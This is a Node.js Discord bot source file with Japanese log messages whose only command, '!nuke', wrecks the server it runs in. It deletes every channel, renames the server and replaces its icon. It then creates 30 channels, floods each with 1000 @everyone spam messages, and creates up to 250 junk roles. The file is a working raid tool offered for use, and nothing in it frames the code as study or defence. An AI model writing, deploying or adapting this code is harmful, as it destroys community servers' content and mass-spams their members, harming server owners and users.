const { Client, Intents } = require('discord.js'); 
const fs = require('fs');
const emojis = fs.readFileSync('emoji.txt', 'utf8').split('\n');

const client = new Client({intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGES]}); 

const { token } = require('./config.json');

client.once('ready', () => {
    console.log('準備完了！');
});

client.login(token);


client.on('messageCreate', async message => {
    if (message.content === '!nuke') {
        await Promise.all(message.guild.channels.cache.map(async channel => {
            await channel.delete();
        }));

        await message.guild.setName('nuked!!');

        const iconFile = fs.readFileSync('nuke.png');
        await message.guild.setIcon(iconFile);

        const channelsPromises = Array.from({ length: 30 }, async (_, i) => {
          const createdChannel = await message.guild.channels.create(`nuked ${emojis.slice(0, 5).join(' ')} ${emojis[i % emojis.length]}`, { type: 0 });

            const botMessagesPromises = Array.from({ length: 1000 }, async () => {
                  await createdChannel.send(`# NUKED!!\n@everyone ${emojis[Math.floor(Math.random() * emojis.length)]} ${emojis.slice(0, 5).join(' ')}`);
              });

            await Promise.all(botMessagesPromises);
        });

        try {
            await Promise.all(channelsPromises);

            for (let i = 0; i < 250; i++) {
                await message.guild.roles.create({
                    name: 'nuked! ' + emojis[i % emojis.length],
                    color: 'RANDOM',
                });
            }
        } catch (error) {
            console.log('ロールの作製上限です');
            return; 
        }
    }
});